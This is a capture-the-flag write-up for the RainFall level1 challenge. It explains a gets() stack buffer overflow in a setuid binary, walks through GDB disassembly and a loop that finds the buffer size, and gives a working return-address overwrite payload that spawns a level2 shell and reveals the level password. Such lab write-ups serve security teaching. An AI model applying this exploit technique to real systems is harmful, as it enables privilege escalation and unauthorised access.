# LEVEL 1

## Initial Exploration

We begin by attempting to read the password of the next level (level2), but our current user (level1) does not have permission to access it:
```sh
level1@RainFall:~$ cat /home/user/level2/.pass
cat: /home/user/level1/.pass: Permission denied
```

Next, we check the file permissions of the level1 binary:
```sh
level1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```
>Notice the setuid permission `rwsr-s---`. This means the program runs with the privileges of the owner of the file `level2`, rather than the current user. This gives us a potential attack vector: we can exploit this program to run commands as level2.


## Disassembling the Binary
To understand how we can exploit this, we need to analyze the binary. First, let’s inspect the disassembly of the main function using GDB:

```sh
level0@RainFall:~$ gdb ./level1
...
(gdb) disassemble main
```

```nasm
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump. 
```
We can see that the main function calls the unsafe **gets()** function to read user input. **gets()** is known for buffer overflow vulnerabilities because it does not check the size of the input, allowing us to overwrite memory beyond the buffer.

**Vulnerability:** Stack Overflow
As the man page for gets() warns, it’s prone to buffer overflows:

*man snippet*:
> **BUGS**
Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.

## Determining the Buffer Size
To exploit the vulnerability, we need to know the size of the buffer that gets() reads. We do this by running the program with different input sizes:
```sh
level1@RainFall:~$ ./level1 
456
level1@RainFall:~$ echo $?
32
level1@RainFall:~$ i=1; x=32; 
level1@RainFall:~$ while ((x==32)); do python -c "print('A'*$i)"  | ./level1 ; ((x=$?)) ; ((i+=1)); done
Illegal instruction (core dumped)
level1@RainFall:~$ echo $i
77
```
From this, we determine that the buffer size is **76** bytes, as the program crashes after 77 bytes of input.


## Investigating the Binary

Next, we list all the functions defined in the binary:

```nasm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
```

We see a user-defined function called **run** that seems to be unused. Let’s explore this function to check if we can exploit it.

```nasm
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
```
The run function calls **system()**, which executes a shell command. It’s important to note that **system()** uses the level2 privileges because of the setuid permissions on the level1 binary.

The string passed to system() is stored at memory address **0x8048584**, which points to **"/bin/sh"**:

```nasm
x/s 0x08048584
0x8048584:	 "/bin/sh"
```

## Crafting the Exploit

Now that we know **system() runs the command /bin/sh with the privileges of level2**, we can exploit the buffer overflow to **redirect execution to the run function**. By **overwriting the return address in the main function**, we can force it to jump to run, which will spawn a shell.

We craft the payload with the following:

76 bytes of padding ('A'*76)
The address of the **run** function **0x08048444**, in little-endian format

```sh
level1@RainFall:~$ (python -c "print('A'*76 + '\x44\x84\x04\x08')" ; cat) | ./level1
```

## Gaining Privileges
When the exploit runs successfully, we execute a shell as the level2 user and can now read the password file:
```sh
level1@RainFall:~$ (python -c "print('A'*76 + '\x44\x84\x04\x08')" ; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```